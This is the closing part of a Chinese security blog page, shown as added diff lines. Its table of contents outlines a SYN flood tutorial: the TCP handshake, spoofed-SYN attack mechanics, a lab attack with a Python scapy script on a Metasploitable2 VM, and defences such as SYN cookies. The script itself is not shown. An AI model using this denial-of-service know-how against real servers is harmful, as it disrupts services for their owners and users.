+                <a href="/2017/09/03/无线渗透(下)—企业级WPA破解/">
+                    无线渗透(下)—企业级WPA破解
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-Syn-Flood攻击简介"><span class="toc-number">1.</span> <span class="toc-text">0x00. Syn-Flood攻击简介</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-Syn-Flood-Attack是一种基于TCP-IP协议的拒绝服务攻击，它会造成服务器TCP连接数达到最大上限，从而不能为新的用户的正常访问请求建立TCP连接，以此达到攻击目的。这种攻击方式危害巨大，不仅会让用户体验不佳，更直接的影响是对企业造成严重的经济损失！所以我们有必要了解这种攻击的原理和防御措施。"><span class="toc-number">1.0.1.</span> <span class="toc-text">  Syn-Flood Attack是一种基于TCP/IP协议的拒绝服务攻击，它会造成服务器TCP连接数达到最大上限，从而不能为新的用户的正常访问请求建立TCP连接，以此达到攻击目的。这种攻击方式危害巨大，不仅会让用户体验不佳，更直接的影响是对企业造成严重的经济损失！所以我们有必要了解这种攻击的原理和防御措施。</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-TCP-IP三次握手"><span class="toc-number">2.</span> <span class="toc-text">0x01. TCP/IP三次握手</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-第一次握手：Client将标志位-也就是flags位-SYN置为1，随机产生一个值seq-J，并将该数据包发送给Server，Client进入SYN-SENT状态，等待Server确认。"><span class="toc-number">2.0.1.</span> <span class="toc-text">1.第一次握手：Client将标志位(也就是flags位)SYN置为1，随机产生一个值seq=J，并将该数据包发送给Server，Client进入SYN_SENT状态，等待Server确认。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-第二次握手：Server收到数据包后由标志位SYN-1知道Client请求建立连接，Server将标志位SYN和ACK都置为1，ack-J-1，随机产生一个值seq-K，并将该数据包发送给Client以确认连接请求，Server进入SYN-RCVD状态。"><span class="toc-number">2.0.2.</span> <span class="toc-text">2.第二次握手：Server收到数据包后由标志位SYN=1知道Client请求建立连接，Server将标志位SYN和ACK都置为1，ack=J+1，随机产生一个值seq=K，并将该数据包发送给Client以确认连接请求，Server进入SYN_RCVD状态。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-第三次握手：Client收到确认后，检查ack是否为J-1，ACK是否为1，如果正确则将标志位ACK置为1，ack-K-1，并将该数据包发送给Server，Server检查ack是否为K-1，ACK是否为1，如果正确则连接建立成功，Client和Server进入ESTABLISHED状态，完成三次握手，随后Client与Server之间可以开始传输数据了。"><span class="toc-number">2.0.3.</span> <span class="toc-text">3.第三次握手：Client收到确认后，检查ack是否为J+1，ACK是否为1，如果正确则将标志位ACK置为1，ack=K+1，并将该数据包发送给Server，Server检查ack是否为K+1，ACK是否为1，如果正确则连接建立成功，Client和Server进入ESTABLISHED状态，完成三次握手，随后Client与Server之间可以开始传输数据了。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#下面是笔者用Wireshark抓到的三次握手连接，可以看到FLAG位的SYN已经被set为1-读者们也可以自己抓包来分析包结构更好的学习。"><span class="toc-number">2.0.4.</span> <span class="toc-text">[*]下面是笔者用Wireshark抓到的三次握手连接，可以看到FLAG位的SYN已经被set为1,读者们也可以自己抓包来分析包结构更好的学习。</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Syn-Flood攻击原理"><span class="toc-number">3.</span> <span class="toc-text">0x02. Syn-Flood攻击原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#上图简要介绍了Syn-Flood攻击过程"><span class="toc-number">3.1.</span> <span class="toc-text">上图简要介绍了Syn-Flood攻击过程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-攻击者先向目标机发送SYN包，请求建立TCP连接"><span class="toc-number">3.1.1.</span> <span class="toc-text">1.攻击者先向目标机发送SYN包，请求建立TCP连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-目标机接收到SYN包之后，便会进入SYN-RCVD状态，然后又给攻击者回一个SYN-ACK包"><span class="toc-number">3.1.2.</span> <span class="toc-text">2.目标机接收到SYN包之后，便会进入SYN_RCVD状态，然后又给攻击者回一个SYN-ACK包</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-如果攻击者发送SYN包时用的是伪造IP地址，那么目标机发送的SYN-ACK就很可能不可达，得不到ACK来建立完整的三次握手连接，这时目标机就会保持SYN-RCVD状态直到timeout。想象一下，如果我们一直发送SYN包请求连接，但是又不和目标机器建立完整的TCP连接，一会大家看看我的攻击脚本就知道这是一件多么可怕的事了"><span class="toc-number">3.1.3.</span> <span class="toc-text">3.如果攻击者发送SYN包时用的是伪造IP地址，那么目标机发送的SYN-ACK就很可能不可达，得不到ACK来建立完整的三次握手连接，这时目标机就会保持SYN_RCVD状态直到timeout。想象一下，如果我们一直发送SYN包请求连接，但是又不和目标机器建立完整的TCP连接，一会大家看看我的攻击脚本就知道这是一件多么可怕的事了</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-如果攻击者用的是本主机真实的IP地址的话，那么攻击者接受到ACK之后正常情况下会回复一个RST包-为什么不是ACK呢，因为攻击时我们是用pyhton的scapy库来发包的，本地网卡并不认为自己发送了SYN包，莫名奇妙接收到一个SYN-ACK包当然会回复RST包啦"><span class="toc-number">3.1.4.</span> <span class="toc-text">4.如果攻击者用的是本主机真实的IP地址的话，那么攻击者接受到ACK之后正常情况下会回复一个RST包(为什么不是ACK呢，因为攻击时我们是用pyhton的scapy库来发包的，本地网卡并不认为自己发送了SYN包，莫名奇妙接收到一个SYN-ACK包当然会回复RST包啦)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Syn-Flood攻击实战"><span class="toc-number">4.</span> <span class="toc-text">0x03. Syn-Flood攻击实战</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-有了前面的理论基础，大家就能开心的做自己的测试了，就算遇到问题也能轻松的解决啦！所以理论还是很有用的，不要一味的只知道操作步骤而不知道原理。还有就是脚本什么的大家可以根据自己的理解来编写，不一定要用我的蹩脚的代码。"><span class="toc-number">4.0.1.</span> <span class="toc-text">  有了前面的理论基础，大家就能开心的做自己的测试了，就算遇到问题也能轻松的解决啦！所以理论还是很有用的，不要一味的只知道操作步骤而不知道原理。还有就是脚本什么的大家可以根据自己的理解来编写，不一定要用我的蹩脚的代码。</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#环境准备"><span class="toc-number">4.1.</span> <span class="toc-text">环境准备</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-1-Syn-Flood脚本"><span class="toc-number">4.1.1.</span> <span class="toc-text">  1.Syn-Flood脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-2-Wireshark抓包工具"><span class="toc-number">4.1.2.</span> <span class="toc-text">  2.Wireshark抓包工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-3-metaploitable2-0-linux-emsp-IP-192-168-43-109"><span class="toc-number">4.1.3.</span> <span class="toc-text">  3.metaploitable2.0-linux  IP=192.168.43.109</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Syn-Flood脚本如下（注意：该脚本需要python-2-7版本，还需要安装scapy、threading、random库）："><span class="toc-number">4.1.4.</span> <span class="toc-text">Syn-Flood脚本如下（注意：该脚本需要python 2.7版本，还需要安装scapy、threading、random库）：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击流程"><span class="toc-number">4.2.</span> <span class="toc-text">攻击流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-启动metasploit2-0，访问它的web服务-现在我们可以很流畅的访问到"><span class="toc-number">4.2.1.</span> <span class="toc-text">1.启动metasploit2.0，访问它的web服务,现在我们可以很流畅的访问到</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-启动python脚本，填写必要的参数，当然也可以攻击22，3389之类的基于TCP连接的端口"><span class="toc-number">4.2.2.</span> <span class="toc-text">2.启动python脚本，填写必要的参数，当然也可以攻击22，3389之类的基于TCP连接的端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-现在查看效果，可以看到web应用已经不能正常访问了，而且靶机的80端口由于受到Syn-Flood攻击全部处于SYN-RECV状态"><span class="toc-number">4.2.3.</span> <span class="toc-text">3.现在查看效果，可以看到web应用已经不能正常访问了，而且靶机的80端口由于受到Syn-Flood攻击全部处于SYN_RECV状态</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-防御措施"><span class="toc-number">5.</span> <span class="toc-text">0x04. 防御措施</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#emsp-emsp-看到这里相信大家已经对Syn-Flood这种攻击方式有一定的了解了，下面来谈谈如何应对"><span class="toc-number">5.1.</span> <span class="toc-text">  看到这里相信大家已经对Syn-Flood这种攻击方式有一定的了解了，下面来谈谈如何应对</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-如果某个端口和同一个IP建立了多个不完整连接，直接禁IP"><span class="toc-number">5.1.1.</span> <span class="toc-text">1.如果某个端口和同一个IP建立了多个不完整连接，直接禁IP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-减少SYN-RECEIVED的过期时间"><span class="toc-number">5.1.2.</span> <span class="toc-text">2.减少SYN-RECEIVED的过期时间</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-设置SYN-Cookie"><span class="toc-number">5.1.3.</span> <span class="toc-text">3.设置SYN Cookie</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-设置防火墙的进站和入站规则"><span class="toc-number">5.1.4.</span> <span class="toc-text">4.设置防火墙的进站和入站规则</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-记录日志方便溯源追踪真凶"><span class="toc-number">5.1.5.</span> <span class="toc-text">5.记录日志方便溯源追踪真凶</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-结语"><span class="toc-number">6.</span> <span class="toc-text">0x05. 结语</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-关于拒绝服务攻击还有其他很多姿势，如果大家想了解更多的话可以关注一波公众号，我们一起探讨！我们这里也需要大家分享更多的知识一起来营造良好的学习氛围。"><span class="toc-number">6.0.1.</span> <span class="toc-text">  关于拒绝服务攻击还有其他很多姿势，如果大家想了解更多的话可以关注一波公众号，我们一起探讨！我们这里也需要大家分享更多的知识一起来营造良好的学习氛围。</span></a></li></ol></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"Syn-Flood　| TimeS0ng's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+        <section class="youyan" id="comments">
+    <script>
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = 'http://v2.uyan.cc/code/uyan.js?uid=2142877';
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <aside class="comment-bar">
+        <a href="javascript:void(0);">
+            <i class="fa fa-commenting-o animated infinite pulse"></i>
+            <i class="fa fa-spinner fa-pulse"></i>
+            <span class="count-comment"></span>
+        </a>
+    </aside>
+    <script>
+        var $commentBar = $("#comments aside.comment-bar");
+        var load$hide = function(){
+            $commentBar.find("a > i").toggle();
+            loadComment();
+            $commentBar.fadeOut(800);
+        }
+        $commentBar.click(function(){
+            load$hide();
+        })
+        $commentBar.children("a").hover(function(){
+            load$hide();
+        })
+        if (window.location.hash === "#comments") {
+            load$hide();
+        }
+    </script>
+
+    <div id="uyan_frame"></div>
+</section>
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2017/09/03/无线渗透(下)—企业级WPA破解/" title="下一篇: 无线渗透(下)—企业级WPA破解">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/09/21/Syn-Flood/">Syn-Flood</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/03/无线渗透(下)—企业级WPA破解/">无线渗透(下)—企业级WPA破解</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/30/无线渗透(中)--WPS破解/">无线渗透(中)--WPS破解</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/30/无线渗透(上)--WPA加密/">无线渗透(上)--WPA加密</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/信息收集— 僵尸扫描/">信息收集— 僵尸扫描</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2017 TimeS0ng
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+    <script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
